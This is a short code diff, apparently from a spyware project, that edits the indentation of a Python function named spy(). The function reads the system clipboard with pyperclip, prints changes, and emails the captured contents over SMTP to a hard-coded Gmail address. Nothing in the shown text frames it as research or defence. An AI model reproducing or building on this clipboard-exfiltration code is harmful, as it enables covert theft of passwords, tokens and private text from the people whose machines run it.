@@ -13,13 +13,13 @@ def spy():
 
 	#while True:
 
-		if data != pyperclip.paste().encode("utf-8"):	
+	if data != pyperclip.paste().encode("utf-8"):	
 				
-			data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
-			print(data)
+		data = pyperclip.paste().encode("utf-8") #.decode('utf-8')
+		print(data)
 
-			server.sendmail("jacksonsoftwaresolutions@gmail.com",
-			"jacksonsoftwaresolutions@gmail.com", data)
+		server.sendmail("jacksonsoftwaresolutions@gmail.com",
+		"jacksonsoftwaresolutions@gmail.com", data)
 
 	server.close()
 
